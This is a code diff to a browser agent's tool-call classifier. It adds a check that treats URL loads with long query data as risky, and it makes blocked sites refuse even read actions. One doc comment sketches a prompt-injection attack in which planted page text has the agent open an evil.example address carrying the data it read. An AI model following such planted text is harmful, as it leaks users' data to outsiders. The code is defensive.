@@ -27,6 +27,15 @@ export type PageContext = { payment?: boolean; passwordChange?: boolean };
 
 // A batch or script is judged action by action as it runs (agent/session.ts callTool), so the batch itself is a read.
 const READ_TOOLS = new Set(["navigate", "snapshot", "find", "screenshot", "scroll", "hover", "wait_for", "back", "tabs", "open_tab", "switch_tab", "downloads", "batch", "script", "done", "read_document"]);
+/** Tools that load an address: a read only while the address carries no payload (carriesData). */
+const URL_TOOLS = new Set(["navigate", "open_tab", "read_document"]);
+/**
+ * Reads that touch no page, so a site's "never" rule does not stop them: without this, an agent
+ * whose tab sits on a blocked site could not even finish.
+ */
+export const OFF_PAGE = new Set(["done", "tabs", "switch_tab", "downloads", "batch", "script"]);
+const MAX_QUERY = 200;
+const MAX_QUERY_VALUE = 120;
 
 const RISKY = /\b(send|post|publish|submit|turn in|hand in|go live|push live|make live|deploy|delete|remove|discard|share|invite|transfer|confirm|sign up|unsubscribe|reply|forward|archive|trash)\b/i;
 const PAYMENT =
@@ -62,6 +71,7 @@ export function classify(call: ToolCall, target?: Target, page: PageContext = {}
   const guarded = Boolean(page.payment || page.passwordChange);
   const app = appTool(call.name);
   if (app) return app.kind(call.args);
+  if (URL_TOOLS.has(call.name)) return carriesData(String(call.args.url ?? "")) ? "risky" : "read";
   if (READ_TOOLS.has(call.name)) return "read";
   // The REPL runs in a read-only sandbox (src/page/repl.ts); writes go through the other tools.
   if (call.name === "repl") return "read";
@@ -93,6 +103,24 @@ export function classify(call: ToolCall, target?: Target, page: PageContext = {}
   if (call.name === "hover") return "read";
   if (call.name === "click") return clickKind(target, guarded);
   return "risky";
+}
+
+/**
+ * An address that could carry data out: a long query and fragment, or one long query value. Text
+ * a page planted can tell the agent to open https://evil.example/?d=<what it read>; loading that
+ * address sends the data without any click, so it asks like a send does. Ordinary links and
+ * searches stay well under these lengths.
+ */
+export function carriesData(raw: string): boolean {
+  const trimmed = raw.trim();
+  let url: URL;
+  try {
+    url = new URL(/^[a-z][a-z0-9+.-]*:/i.test(trimmed) ? trimmed : `https://${trimmed}`);
+  } catch {
+    return false;
+  }
+  if (url.search.length + url.hash.length > MAX_QUERY) return true;
+  return [...url.searchParams.values()].some((v) => v.length > MAX_QUERY_VALUE);
 }
 
 /** Roles whose click only selects an option; the form's own button is what commits it. */
@@ -135,9 +163,10 @@ function isEnter(call: ToolCall): boolean {
   return /(^|\+)enter$/i.test(String(call.args.key ?? ""));
 }
 
+/** A "never" site is blocked even for reads, so the agent cannot open or read it either. */
 export function needsApproval(mode: Mode, kind: Kind, siteRule?: SiteRule): Decision {
-  if (kind === "read") return "run";
   if (siteRule === "never") return "block";
+  if (kind === "read") return "run";
   if (siteRule === "ask") return "ask";
   if (kind === "payment") return "ask";
   if (siteRule === "allow") return "run";
